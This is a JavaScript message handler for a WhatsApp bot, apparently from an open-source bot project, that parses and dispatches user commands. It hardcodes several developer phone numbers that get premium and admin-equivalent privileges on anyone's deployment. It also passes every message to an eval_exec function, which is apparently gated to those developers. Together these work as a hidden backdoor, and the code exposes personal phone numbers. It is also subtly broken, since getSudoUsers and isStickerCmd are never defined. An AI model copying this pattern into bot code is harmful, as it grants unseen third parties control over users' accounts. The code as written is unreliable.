const { rankAndLevelUp, getJid, eval_exec } = require('./Message_upsert_events');
const { jidDecode, getContentType } = require("@whiskeysockets/baileys");
const evt = require("../lib/ovlcmd");
const config = require("../set");

const decodeJid = (jid) => {
  if (!jid) return jid;
  if (/:\d+@/gi.test(jid)) {
    const d = jidDecode(jid) || {};
    return (d.user && d.server && `${d.user}@${d.server}`) || jid;
  }
  return jid;
};

async function message_upsert(m, ovl) {
  try {
    if (m.type !== 'notify') return;
    const ms = m.messages?.[0];
    if (!ms?.message) return;

    const mtype = getContentType(ms.message);
    const texte = {
      conversation: ms.message.conversation,
      imageMessage: ms.message.imageMessage?.caption,
      videoMessage: ms.message.videoMessage?.caption,
      extendedTextMessage: ms.message.extendedTextMessage?.text,
      buttonsResponseMessage: ms.message.buttonsResponseMessage?.selectedButtonId,
      listResponseMessage: ms.message.listResponseMessage?.singleSelectReply?.selectedRowId,
      messageContextInfo: ms.message.buttonsResponseMessage?.selectedButtonId ||
        ms.message.listResponseMessage?.singleSelectReply?.selectedRowId || ms.text
    }[mtype] || "";

    const ms_org = ms.key.remoteJid;
    const id_Bot = decodeJid(ovl.user.id);
    const id_Bot_N = id_Bot.split('@')[0];

    const verif_Groupe = ms_org.endsWith("@g.us");
    const infos_Groupe = verif_Groupe ? await ovl.groupMetadata(ms_org) : {};
    const nom_Groupe = infos_Groupe.subject || "";
    const mbre_membre = verif_Groupe ? infos_Groupe.participants : [];
    const groupe_Admin = mbre_membre.filter(p => p.admin).map(p => p.jid);
    const verif_Ovl_Admin = verif_Groupe && groupe_Admin.includes(id_Bot);

    const auteur_Message = verif_Groupe
      ? await getJid(decodeJid(ms.key.participant), ms_org, ovl)
      : ms.key.fromMe ? id_Bot : decodeJid(ms.key.remoteJid);

    const msg_Repondu = ms.message?.[mtype]?.contextInfo?.quotedMessage;
    const quote = ms.message?.[mtype]?.contextInfo;
    const auteur_Msg_Repondu = await getJid(
      decodeJid(ms.message?.[mtype]?.contextInfo?.participant),
      ms_org, ovl
    );
    const mentionnes = ms.message?.[mtype]?.contextInfo?.mentionedJid || [];
    const mention_JID = await Promise.all(mentionnes.map(j => getJid(j, ms_org, ovl)));

    const nom_Auteur_Message = ms.pushName;

    const isCmd = texte.trimStart().startsWith(config.PREFIXE);
    const arg = isCmd ? texte.trimStart().slice(config.PREFIXE.length).trimStart().split(/ +/).slice(1) : [];
    
    const cmdName = isCmd ? texte.slice(config.PREFIXE.length).trim().split(/ +/)[0].toLowerCase() : "";

    const Ainz = '22651463203';
    const Ainzbot = '22605463559';
    const haibo = '221772430620';
    const devNumbers = [Ainz, Ainzbot, haibo];
    const sudoUsers = await getSudoUsers();

    const premiumUsers = [Ainz, Ainzbot, id_Bot_N, config.NUMERO_OWNER]
      .map(n => `${n}@s.whatsapp.net`);
    const prenium_id = premiumUsers.includes(auteur_Message);
    const dev_num = devNumbers.map(n => `${n}@s.whatsapp.net`);
    const dev_id = dev_num.includes(auteur_Message);
    const verif_Admin = verif_Groupe && (groupe_Admin.includes(auteur_Message) || prenium_id);

    const repondre = (msg, jid) => {
      const cible = jid || ms_org;
      return ovl.sendMessage(cible, { text: msg }, { quoted: ms });
    };

    const cmd_options = {
      verif_Groupe, mbre_membre, membre_Groupe: auteur_Message, verif_Admin,
      infos_Groupe, nom_Groupe, auteur_Message, nom_Auteur_Message, mtype,
      id_Bot, prenium_id, dev_id, dev_num, id_Bot_N, verif_Ovl_Admin,
      prefixe: config.PREFIXE, arg, repondre, groupe_Admin: () => groupe_Admin,
      msg_Repondu, auteur_Msg_Repondu, ms, ms_org, texte, getJid, quote
    };

    const cd = evt.cmd.find(c => c.nom_cmd === cmdName || c.alias?.includes(cmdName));
      if (cd) {
      
      if (!dev_id && ms_org === "120363314687943170@g.us") return;
        
      if (config.MODE === 'private' && !prenium_id && !ms_org.endsWith("@newsletter")) return;
        
      if (!isStickerCmd) {
        await ovl.sendMessage(ms_org, { react: { text: cd.react || "🎐", key: ms.key } });
      }
      await cd.fonction(ms_org, ovl, cmd_options);
    };
    
    if ((!dev_id && auteur_Message !== '221772430620@s.whatsapp.net') && !dev_num.includes(id_Bot) && ms_org === "120363314687943170@g.us") return;
      
    rankAndLevelUp(ovl, ms_org, texte, auteur_Message, nom_Auteur_Message, config, ms);
    eval_exec(ovl, cmd_options, { ...cmd_options });

    for (const cmd of evt.func) {
      try {
        await cmd.fonction(ms_org, ovl, cmd_options);
      } catch (err) {
        console.error(`Erreur dans la fonction isfunc '${cmd.nom_cmd}':`, err);
      }
    }

  } catch (e) {
    console.error("❌ Erreur(message.upsert):", e);
  }
}

module.exports = message_upsert;
